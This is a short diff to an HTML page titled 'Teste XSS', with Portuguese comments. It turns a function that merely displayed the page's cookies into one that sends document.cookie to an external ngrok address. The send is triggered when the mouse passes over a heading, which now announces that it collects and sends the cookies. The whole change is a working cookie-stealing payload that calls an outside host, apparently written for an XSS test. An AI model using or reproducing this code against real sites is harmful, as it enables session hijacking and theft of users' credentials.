@@ -3,18 +3,25 @@
 <head>
   <title>Teste XSS</title>
   <script>
-    function displayCookies() {
+    function sendCookiesToServer() {
       // Obtém os cookies do documento
       var cookies = document.cookie;
       
-      // Exibe os cookies dentro da tag <span>
+      // Cria um objeto XMLHttpRequest para enviar os cookies para o servidor
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "http://0.tcp.sa.ngrok.io:19439/log_cookie?cookie=" + encodeURIComponent(cookies), true);
+      
+      // Envia os cookies para o servidor
+      xhr.send();
+      
+      // Exibe os cookies na tela (opcional)
       document.getElementById("cookieDisplay").innerText = cookies;
     }
   </script>
 </head>
 <body>
-  <h1 onmouseover="displayCookies()">
-    Passe o mouse aqui para visualizar os cookies
+  <h1 onmouseover="sendCookiesToServer()">
+    Passe o mouse aqui para coletar e enviar os cookies
   </h1>
 
   <p><strong>Cookies: </strong><span id="cookieDisplay">Nenhum cookie disponível</span></p>
